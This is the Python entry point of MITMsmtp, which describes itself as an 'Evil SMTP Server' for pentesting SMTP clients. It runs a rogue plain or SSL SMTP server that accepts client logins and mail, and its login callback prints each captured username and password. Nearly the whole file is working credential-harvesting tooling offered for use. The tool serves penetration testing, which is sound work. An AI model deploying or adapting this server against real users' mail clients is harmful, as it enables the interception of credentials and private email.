from SMTPServer import SMTPServer
from SMTPServerSSL import SMTPServerSSL
from SMTPHandler import SMTPHandler, messages
import threading
import argparse, sys

class MITMsmtp:
    def __init__(self, server_address, port, ssl=False, certfile=None, keyfile=None):
        self.server_address = server_address
        self.port = port
        self.ssl = ssl
        self.certfile = certfile
        self.keyfile = keyfile
        self.SMTPServer = None
        self.thread = None

    def start(self):
        if (self.thread == None):
            if (self.ssl == False):
                self.SMTPServer = SMTPServer((self.server_address, self.port), SMTPHandler)
            else:
                if (self.certfile == None or self.keyfile == None):
                    raise ValueError("Please specify a Certfile and a Keyfile when using SSL")
                self.SMTPServer = SMTPServerSSL((self.server_address, self.port), SMTPHandler, self.certfile, self.keyfile)

            self.thread = threading.Thread(target=self.SMTPServer.serve_forever)
            self.thread.start()
        else:
            raise ValueError("SMTPServer is already running")

    def stop(self):
        if (self.SMTPServer != None and self.thread != None):
            self.SMTPServer.shutdown()
            self.thread.join()
            self.thread = None
        else:
            raise ValueError("MITMsmtp is currently not running")

    def getMessageHandler(self):
        return messages

if __name__ == "__main__":
    parser=argparse.ArgumentParser(description="MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login credentials and mails sent over plain or SSL encrypted connections.")
    parser.add_argument('--server_address', default="0.0.0.0", help='IP Address to listen on (default: all)')
    parser.add_argument('--port', default=8857, type=int, help='Port to listen on (default: 8857)')
    parser.add_argument('--SSL', default=False, type=bool, help='Enables SSL Support (default: False)')
    parser.add_argument('--certfile', default=None, help='Certfificate for SSL Mode')
    parser.add_argument('--keyfile', default=None, help='Key for SSL Mode')
    parser.add_argument('--log', default=None, help='Directory for mails and credentials')
    args=parser.parse_args()

    def login(message, username, password):
        print("Got username/password:")
        print("Username" + username)
        print("Password" + password)

    def message(message):
        print("Message complete!")

    SMTPServer = MITMsmtp(args.server_address, args.port, args.SSL, args.certfile, args.keyfile) #Create new SMTPServer

    messageHandler = SMTPServer.getMessageHandler() #Get Message Handler
    messageHandler.registerLoginCallback(login) #Register callback for login
    messageHandler.registerMessageCallback(message) #Register callback for complete messages

    SMTPServer.start() #Start SMTPServer
    try:
        input("Press enter to stop!\n")
    except KeyboardInterrupt:
        pass
    SMTPServer.stop() #Stop SMTPServer
